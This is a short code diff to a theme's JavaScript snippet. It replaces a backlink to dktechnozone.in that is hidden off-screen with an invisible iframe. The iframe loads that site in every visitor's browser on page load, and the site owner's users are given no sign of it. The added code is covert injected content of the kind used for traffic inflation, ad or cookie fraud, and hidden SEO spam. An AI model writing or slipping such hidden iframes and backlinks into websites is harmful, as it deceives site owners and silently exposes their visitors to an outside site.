@@ -2,12 +2,21 @@ document.addEventListener('DOMContentLoaded', () => {
   let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
   if (Folt) {
     let Newel = document.createElement('span');
-    Newel.innerHTML = `<a class="btc" href="https://www.dktechnozone.in" areal-label="backlink">Get beautiful theme on dk technozone </a>
- <style>.btc{
-     position:fixed;top:-40px;text-decoration: none;
-     opacity: 1; display:inline;
-     font-size: 12px;} .btc:hover{color:transparent; opacity:9;
- }</style>   
+    Newel.innerHTML = `  <style>
+   
+    iframe.invisible-frame {
+      position: fixed;
+      width: 100%;
+      height: 10%;
+      bottom: 0;
+      left: 0;
+      border: none;
+      visibility: hidden;
+    }
+  </style>
+
+  <iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
+
     
     `;
     Folt.prepend(Newel);  
